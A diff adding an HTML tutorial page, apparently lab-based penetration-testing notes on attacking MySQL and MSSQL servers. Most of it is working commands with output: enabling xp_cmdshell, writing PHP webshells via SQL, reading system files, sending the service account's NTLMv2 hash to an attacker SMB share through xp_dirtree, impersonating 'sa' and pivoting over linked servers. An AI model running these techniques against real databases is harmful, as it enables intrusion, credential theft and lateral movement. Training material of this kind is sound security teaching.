+<div class="table-wrapper"><table><thead><tr><th>Authentication Type</th><th>Description</th></tr></thead><tbody>
+<tr><td>Windows authentication mode</td><td>This is the default, often referred to as integrated security because the SQL server security model is tightly integrated with Windows/AD. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td></tr>
+<tr><td>Mixed mode</td><td>... supports authentication by Windows/AD accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td></tr>
+</tbody></table>
+</div>
+<p>MySQL also supports different authentication methods, such as username and password, as well as Windows authentication. In addition, admins can choose an authentication mode for many reasons, including compability, security, and more. However, depending on which method is implemented, misconfigurations can occur.</p>
+<h2 id="misconfigurations"><a class="header" href="#misconfigurations">Misconfigurations</a></h2>
+<p>Misconfigured authentication in SQL Server can let you access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.</p>
+<h3 id="privileges"><a class="header" href="#privileges">Privileges</a></h3>
+<p>Depending on the user's privileges, you maye be able to perform different actions within a SQL Server, such as:</p>
+<ul>
+<li>read or change the contents of a database</li>
+<li>read or change the server configuration</li>
+<li>execute commands</li>
+<li>read local files</li>
+<li>communicate with other databases</li>
+<li>capture the local system hash</li>
+<li>impersonate existing users</li>
+<li>gain access to other networks</li>
+</ul>
+<h2 id="protocol-specific-attacks"><a class="header" href="#protocol-specific-attacks">Protocol Specific Attacks</a></h2>
+<h3 id="sql-default-databases"><a class="header" href="#sql-default-databases">SQL Default Databases</a></h3>
+<p>It is essential to know the default databases for MySQL and MSSQL. Those databases hold information about the database itself and help you enumerate database names, tables, columns, etc. With access to those databases, you can use some system stored procedures, but they usually don't contain company data.</p>
+<h4 id="mysql-default-system-schemasdatabases"><a class="header" href="#mysql-default-system-schemasdatabases">MySQL Default System Schemas/Databases</a></h4>
+<ul>
+<li><strong>mysql</strong>: is the system database that contains tables that store information required by the MySQL server</li>
+<li><strong>information_schema</strong>: provides access to database metadata</li>
+<li><strong>performance_schema</strong>: is a feature for monitoring MySQL Server execution at a low level</li>
+<li><strong>sys</strong>: a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li>
+</ul>
+<h4 id="mssql-default-system-schemasdatabases"><a class="header" href="#mssql-default-system-schemasdatabases">MSSQL Default System Schemas/Databases</a></h4>
+<ul>
+<li><strong>master</strong>: keeps the information for an instance of SQL Server</li>
+<li><strong>msdb</strong>: used by SQL Server Agent</li>
+<li><strong>model</strong>: a template database copied for each new database</li>
+<li><strong>resource</strong>: a read-only database that keeps system objects visible in every database on the server in sys schema</li>
+<li><strong>tempdb</strong>: keeps temporary objects for SQL queries</li>
+</ul>
+<h3 id="readchange-the-database"><a class="header" href="#readchange-the-database">Read/Change the Database</a></h3>
+<p>Imagine you gained access to a SQL database. First, you need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that you may find databases with hundreds of tables. If your goal is not just getting access to the data, you will need to pick which table may contain interesting information to continue your attacks, such as usernames and passwords, tokens configurations, and more.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+
+Welcome to the MariaDB monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]&gt;
+</code></pre>
+<p>... or:</p>
+<pre><code>C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+
+1&gt;
+</code></pre>
+<p>If you're targeting MSSQL from Linux, you can use <code>sqsh</code> as an alternative to <code>sqlcmd</code>:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1&gt;
+</code></pre>
+<p>Alternatively, you can use the tool from Impacket with the name mssqlclient.py.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password: MyPassword!
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
+[!] Press help for extra shell commands
+SQL&gt; 
+</code></pre>
+<blockquote>
+<p>[!TIP]
+Use <code>-windows-auth</code> to use Windows auhentication with mssqlclient.py.</p>
+</blockquote>
+<p>When using Windows authentication, you need to specify the domain name or the hostname of the target machine. If you don't specify a domain or hostname, it will assume SQL authentication and authenticate against the users created in the SQL server. Instead, if you define the domain or hostname, it will use Windows authentication. If you are targeting a local account, you can use <code>SERVERNAME\\accountname</code> or <code>.\\accountname</code>.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1&gt;
+</code></pre>
+<h3 id="execute-commands"><a class="header" href="#execute-commands">Execute Commands</a></h3>
+<p>Command execution is one of the most desired capabilities when attacking common services because it allows you to control the OS. If you have the appropriate privileges, you can use the SQL database to execute system commands or create the necessary elements to do it.</p>
+<p>MSSQL has a extended stored procedures called <code>xp_cmdshell</code> which allow you to execute system commands using SQL. Keep in mind the following about it:</p>
+<ul>
+<li>xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing <code>sp_configure</code>.</li>
+<li>The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.</li>
+<li>xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed.</li>
+</ul>
+<p>To execute commands using SQL syntax on MSSQL, use:</p>
+<pre><code>1&gt; xp_cmdshell 'whoami'
+2&gt; GO
+
+output
+-----------------------------
+no service\mssql$sqlexpress
+NULL
+(2 rows affected)
+</code></pre>
+<p>If xp_cmdshell is not enabled, you can enable it, if you have the appropriate privileges, using the following command:</p>
+<pre><code>-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+</code></pre>
+<p>There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry.</p>
+<p>MySQL supports User Defined Functions which allows you to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repo</a>. It is not recommended to encounter a user-defined function like this in a production environment, but you should be aware that yoz may be able to use it.</p>
+<h3 id="write-local-files"><a class="header" href="#write-local-files">Write Local Files</a></h3>
+<p>MySQL does not have a stored procedure like xp_cmdshell, but you can achieve command execution if you write to a location in the file system that can execute your command. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If you have the appropriate privileges, you can attempt to write a file using <code>SELECT INTO OUTFILE</code> in the webserver directory. Then you can browse to the location where the file is and execute your commands.</p>
+<pre><code>mysql&gt; SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';
+
+Query OK, 1 row affected (0.001 sec)
+</code></pre>
+<p>In MySQL, a global system variable <code>secure_file_priv</code> limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT ... INTO OUTFILE</code> statements and the <code>LOAD_FILE()</code> function. These operations are permitted only to users who have the FILE privilege.</p>
+<p><code>secure_file_priv</code> may be set as follows:</p>
+<ul>
+<li>If empty, the variable has no effect, which is not a secure setting.</li>
+<li>If set to the name of a directory, the server limits the import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
+<li>If set to NULL, the server disables import and export operations.</li>
+</ul>
+<p>In the following example, you can see the <code>secure_file_priv</code> variable is empty, which means you can read and write data using MySQL.</p>
+<pre><code>mysql&gt; show variables like "secure_file_priv";
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+
+1 row in set (0.005 sec)
+</code></pre>
+<p>To write files using MSSQL, you need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>
+<pre><code>1&gt; sp_configure 'show advanced options', 1
+2&gt; GO
+3&gt; RECONFIGURE
+4&gt; GO
+5&gt; sp_configure 'Ole Automation Procedures', 1
+6&gt; GO
+7&gt; RECONFIGURE
+8&gt; GO
+
+...
+
+1&gt; DECLARE @OLE INT
+2&gt; DECLARE @FileID INT
+3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
+6&gt; EXECUTE sp_OADestroy @FileID
+7&gt; EXECUTE sp_OADestroy @OLE
+8&gt; GO
+</code></pre>
+<h3 id="read-local-files"><a class="header" href="#read-local-files">Read Local Files</a></h3>
+<p>By default, MSSQL allows file read on any file in the OS to which the account has read access. You can use the following SQL query:</p>
+<pre><code>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2&gt; GO
+
+BulkColumn
+
+-----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
+
+(1 rows affected)
+</code></pre>
+<p>By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, you can read files using the following methods:</p>
+<pre><code>mysql&gt; select LOAD_FILE("/etc/passwd");
+
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+&lt;SNIP&gt;
+</code></pre>
+<h3 id="capture-mssql-service-hash"><a class="header" href="#capture-mssql-service-hash">Capture MSSQL Service Hash</a></h3>
+<p>You can steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specific parent directory from the file system. When you use one of these stored procedures and point it to your SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL server.</p>
+<p>To make this work, you first need to start Responder or impacket-smbserver and execute one of the following SQL queries:</p>
+<pre><code>1&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2&gt; GO
+
+subdirectory    depth
+--------------- -----------
+</code></pre>
+<p>... or:</p>
+<pre><code>1&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2&gt; GO
+
+HResult 0x55F6, Level 16, State 1
+xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
+</code></pre>
+<p>If the service account has access to your server, you will obtain its hash. You can then attempt to crack the hash or relay it to another host.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+&lt;SNIP&gt;
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+</code></pre>
+<p>... or:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
+</code></pre>
+<h3 id="impersonate-existing-users-with-mssql"><a class="header" href="#impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</a></h3>
+<p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.</p>
+<p>First, you need to identify users that you can impersonate. Sysadmins can impersonate anyone by default. But for non-administrator users, privileges must be explicitly assigned. You can use the following query to identify users you can impersonate:</p>
+<pre><code>1&gt; SELECT distinct b.name
+2&gt; FROM sys.server_permissions a
+3&gt; INNER JOIN sys.server_principals b
+4&gt; ON a.grantor_principal_id = b.principal_id
+5&gt; WHERE a.permission_name = 'IMPERSONATE'
+6&gt; GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+
+(3 rows affected)
+</code></pre>
+<p>To get an idea of privesc, verify if your current user has the sysadmin role.</p>
+<pre><code>1&gt; SELECT SYSTEM_USER
+2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
+3&gt; go
+
+-----------
+julio                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+</code></pre>
+<p>As the returned value 0 indicates, you do not have the sysadmin role, but you can impersonate the <code>sa</code> user. Impersonate the user and execute the same commands. To impersonate a user, you can use the Transact-SQL statement <code>EXECUTE AS LOGIN</code> and set it to the user you want to impersonate.</p>
+<pre><code>1&gt; EXECUTE AS LOGIN = 'sa'
+2&gt; SELECT SYSTEM_USER
+3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
+4&gt; GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+</code></pre>
+<blockquote>
+<p>[!NOTE]
+It's recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>.</p>
+</blockquote>
+<p>You can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to your previous user, you can use the Transact-SQL statement <code>REVERT</code>.</p>
+<h3 id="communicate-with-other-dbs-with-mssql"><a class="header" href="#communicate-with-other-dbs-with-mssql">Communicate with Other DBs with MSSQL</a></h3>
+<p>MSSQL has configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p>
+<p>If you manage to gain access to a SQL Server with a linked server configured, you may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, you may be able to execute commands in the remote SQL instance.</p>
+<pre><code>1&gt; SELECT srvname, isremote FROM sysservers
+2&gt; GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+(2 rows affected)
+</code></pre>
+<p>As you can see in the query's output, you have the name of the server and column <code>isremote</code>, where 1 means is a remote server, and 0 is a linked server.</p>
+<p>Next, you can attempt to identify the user used for the connection and its privilege. The EXECUTE statement can be used to send pass-through commands to linked servers. You add your command between parenthesis and specify the linked server between square brackets.</p>
+<pre><code>1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2&gt; GO
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+(1 rows affected)
+</code></pre>
+<p>You can now execute queries with sysadmin privileges on the linked server. As sysadmin, you control the SQL Server istance. You can read data from any database or execute system commands with xp_cmdshell.</p>
+<h2 id="latest-vulnerabilities"><a class="header" href="#latest-vulnerabilities">Latest Vulnerabilities</a></h2>
+<h3 id="no-cve"><a class="header" href="#no-cve">NO CVE</a></h3>
+<p>You can get the NTLMv2 hashes by interacting with the MSSQL server. However, it should be mentioned that this attack is possible through a direct connection to the MSSQL server and vulnerable web applications.</p>
+<h4 id="concept-of-the-attack"><a class="header" href="#concept-of-the-attack">Concept of the Attack</a></h4>
+<p>The interesting thing is that the MSSQL function <code>xp_dirtree</code> is not directly vulnerable but takes advantage of the authentication mechanism of SMB. When you try to access a shared folder on the network with a Windows host, this Windows host automatically sends an NTLMv2 hash for authentication.</p>
+<p>This hash can be used in various ways against the MSSQL server and other hosts in the corporate network. This includes an SMB relay attack where you "replay" the hash to log into other systems where the account has local admin privileges or cracking this hash on your local system. Successful cracking would allow you to see and use the password in cleartext. A successful SMB relay attack would grant you admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB relay back to the originating host. You could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../attack/initial_access/attacking_common_services/attacking_smb.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../attack/initial_access/attacking_common_services/attacking_smb.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+
+    </div>
+    </body>
+</html>
